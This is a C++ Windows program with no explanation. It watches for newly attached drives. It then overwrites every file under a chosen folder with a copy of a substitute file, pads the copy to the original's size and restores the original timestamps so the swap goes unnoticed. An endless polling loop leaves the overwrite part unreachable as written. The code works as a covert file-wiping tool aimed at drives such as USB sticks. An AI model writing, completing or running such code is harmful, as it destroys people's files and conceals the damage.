#include <fstream>
#include <iostream>
#include <filesystem>
#include <filesystem>
#include <stdio.h>
#include <windows.h>
#include <string>

using namespace std;

namespace fs = filesystem;

string allDrives;


std::ifstream::pos_type GetFileSize(const char* filename)
{
    std::ifstream in(filename, std::ifstream::ate | std::ifstream::binary);
    return in.tellg();
}

char getRemovableDisk()
{
    char drive='0';

    char szLogicalDrives[MAX_PATH];
    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);

    string currentDrives="";

    //cout << dwResult << endl;
    for(int i=0; i<dwResult; i++)
    {
        if(szLogicalDrives[i]>64 && szLogicalDrives[i]< 90)
        {
            currentDrives.append(1, szLogicalDrives[i]);

            if(allDrives.find(szLogicalDrives[i]) > 100)
            {
                drive = szLogicalDrives[i];
            }
        }
    }

    allDrives = currentDrives;

    return drive;
}


string GetLastErrorAsString()
{
    DWORD errorMessageID = ::GetLastError();
    if(errorMessageID == 0)
        return std::string(); //No error message has been recorded

    LPSTR messageBuffer = nullptr;
    size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                                 NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

    std::string message(messageBuffer, size);

    LocalFree(messageBuffer);

    return message;
}


string convertToString(char* a, int size)
{
    int i;
    string s = "";
    for (i = 0; i < size; i++) {
        s = s + a[i];
    }
    return s;
}

int main(int argc, char** argv)
{
  if(argc != 3)
  {
    cerr << "Missing parameters" << endl;
    return 1;
  }

  char driveLetter;

  while(1){
       driveLetter = getRemovableDisk();
       if(driveLetter!='0'){
           printf("%c \n", driveLetter);
       }

       Sleep(1000);
   }

  for (auto& dirEntry: std::filesystem::recursive_directory_iterator(argv[1])) {
    if (!dirEntry.is_regular_file()) {
      //std::cout << "Directory: " << dirEntry.path() << std::endl;
      continue;
    }
    std::filesystem::path file = dirEntry.path();
    //std::cout << "Filename: " << file.filename() << " extension: " << file.extension() << std::endl;

    FILETIME ftCreate;
    FILETIME ftAccess;
    FILETIME ftWrite;

    HANDLE hFile1;
    HANDLE hFile2;

    char fileName[512];

    wcstombs(fileName, file.c_str(), sizeof(fileName));

    char tempFileName[512];
    strcpy(tempFileName, fileName);
    strcat(tempFileName, string(".temp").c_str());

    LPCSTR copyFileName = argv[2];

    cout << "fileName : " << fileName << endl;
    cout << "tempFileName : " << tempFileName << endl;

    fs::remove(tempFileName);
    fs::copy(copyFileName, tempFileName);

    ofstream myfile1;

    long sourceFileSize = GetFileSize(fileName);
    long fileSize = GetFileSize(copyFileName);

    cout << fileName << endl;
    cout << tempFileName << endl;
    cout << fileSize << endl;

    hFile1 = CreateFile(fileName,                // name of the write
                        GENERIC_READ,          // open for writing
                        0,                      // do not share
                        NULL,                   // default security
                        OPEN_EXISTING,             // create new file only
                        FILE_ATTRIBUTE_NORMAL,  // normal file
                        NULL);                  // no attr. template

    if(!GetFileTime(hFile1, &ftCreate, &ftAccess, &ftWrite))
    {
      printf("Something wrong!\n");
      cout << GetLastErrorAsString() << endl;
      return FALSE;
    }


    CloseHandle(hFile1);

    ofstream myfile;
    myfile.open(tempFileName, ios::binary | std::ios_base::app);

    long diffSize = sourceFileSize - fileSize;

    if (myfile.is_open())
    {
      for(long i = 0; i < diffSize; i++)
      {
        myfile << "0";
      }
      myfile.flush();
      myfile.close();
    }
    else
    {
      std::cerr << "didn't write" << std::endl;
    }

    myfile.close();

    fs::remove(fileName);
    rename(tempFileName , fileName);

    hFile2 = CreateFile(fileName,                // name of the write
                        GENERIC_WRITE,          // open for writing
                        0,                      // do not share
                        NULL,                   // default security
                        OPEN_EXISTING,             // create new file only
                        FILE_ATTRIBUTE_NORMAL,  // normal file
                        NULL);                  // no attr. template


    if(!SetFileTime(hFile2, &ftCreate, &ftAccess, &ftWrite))
    {
      printf("Something wrong!\n");
      cout << GetLastErrorAsString() << endl;
      return FALSE;
    }
   }
}
